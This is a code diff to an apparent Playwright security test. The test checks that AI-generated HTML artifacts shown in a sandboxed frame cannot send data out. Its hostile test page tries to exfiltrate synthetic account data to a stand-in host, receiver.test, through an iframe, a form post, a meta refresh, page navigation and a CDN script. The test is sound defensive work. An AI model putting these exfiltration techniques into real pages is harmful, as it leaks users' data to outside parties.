@@ -1,9 +1,9 @@
 import { expect, test } from "@playwright/test";
 import { readFileSync } from "node:fs";
-import { artifactDocument, artifactFrameCsp } from "../lib/ai/artifact-data";
+import { artifactDocument, artifactFrameCsp } from "../lib/ai/artifact-page";
 
-const HOSTILE = `<!doctype html><html><head><meta http-equiv="refresh" content="1;url=http://receiver.test/meta"></head><body>
-<p id="status">waiting</p>
+const HOSTILE = `<!doctype html><html><head></head><body>
+<p id="status">waiting</p><button id="leave">Leave</button>
 <script src="/artifact-lib/echarts.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/leak@1.0.0/index.js?d=1"></script>
 <script>
@@ -18,7 +18,10 @@ const HOSTILE = `<!doctype html><html><head><meta http-equiv="refresh" content="
   attempt(() => { const frame = document.createElement("iframe"); frame.src = "http://receiver.test/frame?d=" + d; document.body.append(frame); });
   attempt(() => { const form = document.createElement("form"); form.action = "http://receiver.test/form"; form.method = "post"; form.innerHTML = '<input name="d">'; form.d.value = d; document.body.append(form); form.submit(); });
   document.getElementById("status").textContent = typeof echarts === "object" && window.MONEO_DATA.balance === "SYNTHETIC-123" ? "charts ready" : "broken";
-  setTimeout(() => attempt(() => { location.href = "http://receiver.test/self?d=" + d; }), 200);
+  document.getElementById("leave").addEventListener("click", () => {
+    const refresh = document.createElement("meta"); refresh.httpEquiv = "refresh"; refresh.content = "0;url=http://receiver.test/meta?d=" + d; document.head.append(refresh);
+    attempt(() => { location.href = "http://receiver.test/self?d=" + d; });
+  });
 </script></body></html>`;
 
 const ORDINARY = `<p id="status">waiting</p><a href="http://receiver.test/link">More</a>
@@ -43,6 +46,7 @@ async function serve(page: import("@playwright/test").Page, html: string) {
 test("a generated page runs its scripts and charts but can't send its data anywhere", async ({ page }) => {
   const { leaked, inner } = await serve(page, HOSTILE);
   await expect(inner.getByText("charts ready")).toBeVisible();
+  await inner.getByRole("button", { name: "Leave" }).click();
   // eslint-disable-next-line no-restricted-syntax -- proving that nothing is sent can only be observed over time
   await page.waitForTimeout(1500);
   expect(leaked).toEqual([]);
